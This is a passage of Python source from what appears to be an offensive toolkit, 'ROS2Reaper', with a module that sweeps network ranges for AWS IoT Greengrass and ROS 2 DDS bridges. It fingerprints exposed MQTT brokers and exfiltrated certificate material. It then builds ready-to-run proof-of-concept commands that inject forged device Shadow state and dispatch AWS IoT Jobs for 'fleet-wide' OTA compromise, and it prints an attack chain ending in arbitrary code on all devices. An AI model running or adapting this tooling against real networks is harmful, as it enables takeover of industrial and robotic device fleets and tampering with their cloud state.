                    + (f"Account: {fp.aws_account_id}. " if fp.aws_account_id else "")
                    + "This enables targeted AWS CLI attacks without network scanning."
                ),
                "cvss":       "7.5",
                "cwe":        "CWE-200",
                "mitre_ics":  "T0840",
                "mitre_att":  "T1592",
            })

        # ── Finding: Local MQTT exposed ───────────────────────────────────────
        if fp.local_mqtt_exposed:
            report.findings.append({
                "id":     "AWS-DDS-003",
                "title":  "Greengrass Local MQTT Broker Network-Exposed",
                "detail": (
                    f"Greengrass local MQTT broker is bound to a network interface "
                    f"on {ip}:{fp.local_mqtt_port} instead of localhost only. "
                    "This exposes the AWS IoT Core bridge channel — Shadow update, "
                    "Jobs notification, and component IPC topics — to any "
                    "network-adjacent host without authentication."
                ),
                "cvss":       "9.1",
                "cwe":        "CWE-668",
                "mitre_ics":  "T0832",
                "mitre_att":  "T1565.001",
            })

        # ── Finding: Anonymous MQTT access ────────────────────────────────────
        if fp.local_mqtt_anon_access:
            report.findings.append({
                "id":     "AWS-DDS-004",
                "title":  "Greengrass Local MQTT Accepts Unauthenticated Connections",
                "detail": (
                    f"MQTT CONNECT accepted without credentials on {ip}:{fp.local_mqtt_port}. "
                    "Attacker can subscribe to all Shadow and Jobs topics and publish "
                    "fabricated Shadow updates that propagate to AWS IoT Core."
                ),
                "cvss":       "9.4",
                "cwe":        "CWE-306",
                "mitre_ics":  "T0832",
                "mitre_att":  "T1565",
            })

        # ── Finding: Shadow topics accessible ────────────────────────────────
        if fp.shadow_topics_accessible:
            report.findings.append({
                "id":     "AWS-DDS-005",
                "title":  "AWS Device Shadow Topics Accessible from Network",
                "detail": (
                    f"Shadow topics confirmed accessible for thing '{fp.thing_name}': "
                    f"{', '.join(fp.shadow_topics_accessible[:3])}. "
                    "Attacker can read current device state and write manipulated "
                    "reported/desired state directly to AWS IoT Core."
                ),
                "cvss":       "9.1",
                "cwe":        "CWE-284",
                "mitre_ics":  "T0832",
                "mitre_att":  "T1565.001",
            })

        # ── Finding: Fleet pivot viable ────────────────────────────────────────
        if fp.fleet_pivot_viable:
            report.findings.append({
                "id":     "AWS-DDS-006",
                "title":  "Fleet-Wide OTA Pivot Viable — IoT Jobs Attack Chain Complete",
                "detail": (
                    "Sufficient credential material and device identity has been "
                    "exfiltrated to attempt AWS IoT Jobs fleet command injection. "
                    "If the Greengrass IAM role includes iot:CreateJob, a single "
                    "HTTPS call to the AWS IoT Jobs API can dispatch a malicious "
                    "OTA update to every device in the thing group."
                ),
                "cvss":       "10.0",
                "cwe":        "CWE-284",
                "mitre_ics":  "T0839",
                "mitre_att":  "T1072",
            })

        # ── DDS bridge component confirmed ────────────────────────────────────
        if fp.dds_bridge_component:
            report.findings.append({
                "id":     "AWS-DDS-007",
                "title":  f"Greengrass DDS Bridge Component Confirmed: {fp.dds_bridge_component}",
                "detail": (
                    "The aws.greengrass.ros2.DDS component is installed and active. "
                    "ROS 2 topic messages are being bridged to AWS IoT Core in real time. "
                    "Phase 2 topic injection attacks propagate directly to the cloud "
                    "Shadow and IoT rules engine."
                ),
                "cvss":       "8.2",
                "cwe":        "CWE-494",
                "mitre_ics":  "T0832",
                "mitre_att":  "T1565.002",
            })

        # ── PoC chains ────────────────────────────────────────────────────────
        if fp.thing_name and fp.local_mqtt_exposed:
            shadow_topic = AWS_SHADOW_TOPICS["update"].format(thing=fp.thing_name)
            report.recommended_poc.append({
                "title":   "Shadow State Injection PoC",
                "command": (
                    f"mosquitto_pub -h {ip} -p {fp.local_mqtt_port} "
                    f"-t '{shadow_topic}' "
                    "-m '{\"state\":{\"reported\":{\"status\":\"nominal\","
                    "\"battery\":100,\"position\":{\"x\":0,\"y\":0}}}}'"
                ),
                "effect": "Overwrite device shadow reported state in AWS IoT Core",
            })

        if fp.thing_arn and fp.aws_region:
            report.recommended_poc.append({
                "title":   "IoT Jobs Fleet Dispatch PoC (requires exfiltrated cert+key)",
                "command": (
                    f"aws iot create-job \\\n"
                    f"  --region {fp.aws_region} \\\n"
                    f"  --job-id 'ros2reaper-test-001' \\\n"
                    f"  --targets '{fp.thing_arn}' \\\n"
                    f"  --document '{{\"operation\":\"echo\",\"msg\":\"pwned\"}}'"
                ),
                "effect":  "Dispatch OTA Job to this device (or entire thing group)",
                "note":    "Replace --targets with thing group ARN for fleet-wide impact",
            })

        # ── Attack chain narrative ─────────────────────────────────────────────
        chain_steps = []
        if fp.dds_component_confirmed:
            chain_steps.append("1. ics_dds_enum.py → Greengrass DDS participant detected")
        if fp.certificate_pem_path:
            chain_steps.append(
                f"2. Cert path exfiltrated: {fp.certificate_pem_path}"
            )
        if fp.thing_arn:
            chain_steps.append(f"3. Thing ARN: {fp.thing_arn}")
        if fp.local_mqtt_exposed:
            chain_steps.append(
                f"4. Local MQTT exposed on {ip}:{fp.local_mqtt_port} → Shadow injection"
            )
        if fp.fleet_pivot_viable:
            chain_steps.append(
                "5. aws iot create-job → fleet-wide OTA → arbitrary code on all devices"
            )

        report.attack_chain_narrative = "\n".join(chain_steps) if chain_steps else (
            "Greengrass/DDS bridge detected — insufficient metadata for full chain"
        )

        # ── Risk level ─────────────────────────────────────────────────────────
        max_cvss = max(
            (float(f.get("cvss", "0")) for f in report.findings), default=0.0
        )
        if max_cvss >= 9.5 or fp.fleet_pivot_viable:
            report.risk_level = "CRITICAL"
        elif max_cvss >= 7.5:
            report.risk_level = "HIGH"
        elif max_cvss >= 4.0:
            report.risk_level = "MEDIUM"
        else:
            report.risk_level = "LOW"

        return report


# ─────────────────────────────────────────────────────────────────────────────
# MAIN SCANNER ORCHESTRATOR
# ─────────────────────────────────────────────────────────────────────────────

class AWSIoTBridgeScanner:
    """
    Orchestrates per-host Greengrass detection, metadata extraction,
    and bridge attack surface analysis.
    """

    def __init__(self, args):
        self.args        = args
        self.fingerprinter = GreengrassFingerprinter(timeout=args.timeout)
        self.analyzer    = AWSIoTBridgeAnalyzer()
        self.results     = []

    def scan_host(self, ip: str) -> Optional[AWSIoTBridgeReport]:
        # Quick DDS port check first
        dds_open = []
        for port in DDS_DISC_PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1.5)
                s.sendto(b"\x52\x54\x50\x53", (ip, port))
                s.recvfrom(64)
                s.close()
                dds_open.append(port)
            except socket.timeout:
                dds_open.append(port)   # optimistic UDP
                s.close()
            except OSError:
                pass

        # Also check Greengrass MQTT directly — can find GG without DDS open
        gg_mqtt_open = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            gg_mqtt_open = s.connect_ex((ip, GREENGRASS_MQTT_PORT)) == 0
            s.close()
        except OSError:
            pass

        if not dds_open and not gg_mqtt_open:
            return None

        fp = self.fingerprinter.fingerprint(
            ip,
            deep       = self.args.deep,
            domain_ids = [0, 1, 5],
        )

        if fp.confidence < 0.10 and not gg_mqtt_open:
            return None

        if fp.confirmed or fp.confidence > 0.15:
            print(
                f"  [+] {ip} | confidence={fp.confidence:.0%} | "
                + ("DDS+Greengrass bridge" if fp.dds_component_confirmed else "Greengrass candidate")
                + (f" | thing={fp.thing_name}" if fp.thing_name else "")
                + (" | MQTT EXPOSED" if fp.local_mqtt_exposed else "")
            )

        return self.analyzer.analyze(ip, dds_open, fp)

    def run(self) -> list:
        targets = []
        if self.args.target:
            targets = [self.args.target]
        elif self.args.cidr:
            net     = ipaddress.ip_network(self.args.cidr, strict=False)
            targets = [str(h) for h in net.hosts()]
            print(f"[*] Sweeping {self.args.cidr} ({len(targets)} hosts)")

        print(f"\n{'='*60}")
        print("  ROS2Reaper :: Phase 3 — AWS IoT Bridge Scanner")
        print(f"{'='*60}\n")

        if not PAHO_AVAILABLE:
            print("[!] paho-mqtt not installed — Shadow/Jobs topic probing disabled")
        if not REQUESTS_AVAILABLE:
            print("[!] requests not installed — Greengrass IPC HTTP enumeration disabled")
        if not PAHO_AVAILABLE or not REQUESTS_AVAILABLE:
            print()

        with ThreadPoolExecutor(max_workers=self.args.threads) as pool:
            futures = {pool.submit(self.scan_host, ip): ip for ip in targets}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)

        self._print_summary()
        return self.results

    def _print_summary(self):
        print(f"\n{'='*60}")
        print("  AWS IOT BRIDGE SCAN SUMMARY")
        print(f"{'='*60}")

        confirmed     = [r for r in self.results if r.bridge_confirmed]
        crit_hosts    = [r for r in self.results if r.risk_level == "CRITICAL"]
        fleet_pivots  = [
            r for r in self.results
            if r.greengrass_fingerprint
            and r.greengrass_fingerprint.get("fleet_pivot_viable")
        ]

        print(f"  Greengrass+DDS confirmed : {len(confirmed)}")
        print(f"  Critical risk hosts      : {len(crit_hosts)}")
        print(f"  Fleet pivot viable       : {len(fleet_pivots)}")

        for r in crit_hosts:
            fp = r.greengrass_fingerprint or {}
            print(f"\n  ⚠  {r.ip} [{r.risk_level}]")
            if fp.get("thing_name"):
                print(f"     Thing     : {fp['thing_name']}")
            if fp.get("thing_arn"):
                print(f"     Thing ARN : {fp['thing_arn']}")
            if fp.get("aws_region"):
                print(f"     Region    : {fp['aws_region']}")
            if fp.get("certificate_pem_path"):
                print(f"     Cert path : {fp['certificate_pem_path']}")
            if fp.get("private_key_path"):
                print(f"     Key path  : {fp['private_key_path']}")
            print(f"\n     Attack chain:")
            for line in r.attack_chain_narrative.split("\n"):
                print(f"       {line}")
            for finding in r.findings:
                print(f"\n     [{finding['id']}] {finding['title']} (CVSS {finding['cvss']})")

        print(f"\n  Attack scenarios:")
        for s in AWS_IOT_ATTACK_SCENARIOS:
            print(f"    [{s['id']}] {s['name']} — CVSS {s['cvss']}")
        print()


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="ROS2Reaper Phase 3 — AWS IoT Greengrass ↔ DDS Bridge Analyzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python3 aws_iot_bridge.py --target 10.0.0.5
    python3 aws_iot_bridge.py --cidr 192.168.1.0/24
    python3 aws_iot_bridge.py --target 10.0.0.5 --deep
    python3 aws_iot_bridge.py --target 10.0.0.5 --shadow-enumerate --output report.json

    # Full Phase 3 sweep
    for module in ics_dds_enum modbus_dnp3_bridge opcua_dds_bridge mqtt_ethercat_bridge aws_iot_bridge; do
        python3 ${module}.py --cidr 10.52.32.0/24 --output ${module}.json
    done
        """
    )
    tgt = p.add_mutually_exclusive_group(required=True)
    tgt.add_argument("--target", help="Single target IP")
    tgt.add_argument("--cidr",   help="CIDR range")

    p.add_argument("--timeout",          type=float, default=4.0)
    p.add_argument("--threads",          type=int,   default=20,
                   help="Lower default than other modules — DDS probing is slower")
    p.add_argument("--deep",             action="store_true",
                   help="Query Greengrass IPC HTTP API + enumerate slave addresses")
    p.add_argument("--shadow-enumerate", action="store_true", dest="shadow_enumerate",
                   help="Probe Shadow/Jobs topics on discovered Greengrass brokers")
    p.add_argument("--output",           metavar="FILE", help="Write JSON report to file")
    return p.parse_args()


def main():
    args    = parse_args()
    scanner = AWSIoTBridgeScanner(args)
    results = scanner.run()

    if args.output:
        with open(args.output, "w") as f:
            json.dump([r.to_dict() for r in results], f, indent=2)
        print(f"[+] Report saved → {args.output}")


if __name__ == "__main__":
    main()
